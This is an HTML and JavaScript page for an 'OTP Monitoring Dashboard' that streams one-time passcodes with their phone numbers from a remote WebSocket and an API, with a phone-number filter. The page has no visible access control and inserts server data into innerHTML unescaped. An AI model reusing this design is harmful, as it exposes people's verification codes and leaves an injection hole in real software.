<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OTP Monitoring Dashboard</title>
    <style>
        :root {
            --primary: #4361ee;
            --secondary: #3f37c9;
            --success: #4cc9f0;
            --danger: #f72585;
            --light: #f8f9fa;
            --dark: #212529;
            --gray: #6c757d;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f7fa;
            margin: 0;
            padding: 20px;
            color: var(--dark);
        }
        
        .container {
            max-width: 1000px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid #e0e0e0;
        }
        
        h1 {
            color: var(--primary);
            margin-bottom: 10px;
            font-weight: 600;
        }
        
        .subtitle {
            color: var(--gray);
            font-size: 1.1rem;
        }
        
        .controls {
            display: flex;
            gap: 15px;
            margin-bottom: 20px;
            flex-wrap: wrap;
        }
        
        .filter-input {
            flex: 1;
            min-width: 250px;
            padding: 10px 15px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 1rem;
        }
        
        .filter-button {
            background-color: var(--primary);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: 500;
            transition: background-color 0.2s;
        }
        
        .filter-button:hover {
            background-color: var(--secondary);
        }
        
        .filter-button:disabled {
            background-color: var(--gray);
            cursor: not-allowed;
        }
        
        #otp-container {
            background: white;
            border-radius: 10px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.08);
            overflow: hidden;
        }
        
        /* ... (keep all your existing styles) ... */
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>OTP Monitoring Dashboard</h1>
            <p class="subtitle">Real-time tracking with historical filtering</p>
        </header>
        
        <div class="controls">
            <input 
                type="text" 
                class="filter-input" 
                id="phone-filter" 
                placeholder="Enter phone number to filter (e.g., 01515619690)"
            >
            <button class="filter-button" id="filter-button">Filter OTPs</button>
            <button class="filter-button" id="clear-filter">Show All</button>
        </div>
        
        <div id="otp-container">
            <div class="status-bar">
                <div class="connection-status">
                    <div class="connection-dot" id="connection-dot"></div>
                    <span id="connection-status">Connecting...</span>
                </div>
                <div id="message-count">0 messages received</div>
            </div>
            <!-- OTP entries will appear here -->
        </div>
    </div>

    <script>
        const ws = new WebSocket('wss://quickotp.up.railway.app');
        let messageCount = 0;
        let allOtps = []; // Stores all OTPs received
        const connectionDot = document.getElementById('connection-dot');
        const connectionStatus = document.getElementById('connection-status');
        const messageCountElement = document.getElementById('message-count');
        const filterInput = document.getElementById('phone-filter');
        const filterButton = document.getElementById('filter-button');
        const clearFilterButton = document.getElementById('clear-filter');
        const otpContainer = document.getElementById('otp-container');

        // Initialize
        fetchAllOtps(); // Load initial data

        // WebSocket handlers
        ws.onopen = () => {
            console.log('WebSocket connected');
            updateConnectionStatus(true);
        };

        ws.onmessage = (event) => {
            const data = JSON.parse(event.data);
            messageCount++;
            messageCountElement.textContent = `${messageCount} messages received`;
            
            // Add to master list
            if (Array.isArray(data)) {
                allOtps.unshift(...data.reverse());
            } else {
                allOtps.unshift(data);
            }
            
            // Display based on current filter
            displayOtps(getFilteredOtps());
        };

        ws.onclose = () => {
            console.log('WebSocket connection closed');
            updateConnectionStatus(false);
        };

        ws.onerror = (error) => {
            console.error('WebSocket error:', error);
            connectionStatus.textContent = 'Connection Error';
        };

        // Filter button handler
        filterButton.addEventListener('click', () => {
            const phoneNumber = filterInput.value.trim();
            if (phoneNumber) {
                displayOtps(getFilteredOtps(phoneNumber));
            }
        });

        // Clear filter handler
        clearFilterButton.addEventListener('click', () => {
            filterInput.value = '';
            displayOtps(getFilteredOtps());
        });

        // Fetch all historical OTPs from server
        async function fetchAllOtps() {
            try {
                const response = await fetch('/fetch-otp-data');
                const data = await response.json();
                
                // Convert object to array and add to allOtps
                Object.entries(data).forEach(([phone, otpData]) => {
                    allOtps.push({
                        phone,
                        otp: otpData.otp,
                        purpose: otpData.purpose,
                        timestamp: otpData.timestamp
                    });
                });
                
                displayOtps(allOtps);
            } catch (error) {
                console.error('Error fetching OTP history:', error);
            }
        }

        // Filter OTPs by phone number
        function getFilteredOtps(phoneNumber = '') {
            if (!phoneNumber) return allOtps;
            return allOtps.filter(otp => otp.phone.includes(phoneNumber));
        }

        // Display OTPs in the container
        function displayOtps(otps) {
            // Clear existing OTPs (except status bar)
            while (otpContainer.children.length > 1) {
                otpContainer.removeChild(otpContainer.lastChild);
            }
            
            // Add filtered OTPs
            otps.forEach(otp => {
                const otpBox = createOtpBox(otp);
                otpContainer.appendChild(otpBox);
            });
        }

        // Create OTP box element
        function createOtpBox({ phone, otp, purpose = 'unknown', timestamp }) {
            const otpBox = document.createElement('div');
            otpBox.className = 'otp-box';
            
            const formattedTime = timestamp ? new Date(timestamp).toLocaleString() : 'Just now';
            const purposeClass = purpose ? `purpose-${purpose.toLowerCase()}` : 'purpose-unknown';
            
            otpBox.innerHTML = `
                <div class="otp-header">
                    <span class="phone-number">${phone}</span>
                    <span class="timestamp">${formattedTime}</span>
                </div>
                <div class="otp-content">
                    <span class="otp-code">${otp}</span>
                    <span class="purpose-badge ${purposeClass}">${purpose}</span>
                </div>
            `;
            
            return otpBox;
        }

        // Update connection status UI
        function updateConnectionStatus(isConnected) {
            connectionDot.classList.toggle('disconnected', !isConnected);
            connectionStatus.textContent = isConnected ? 'Connected (Live)' : 'Disconnected';
        }
    </script>
</body>
</html>
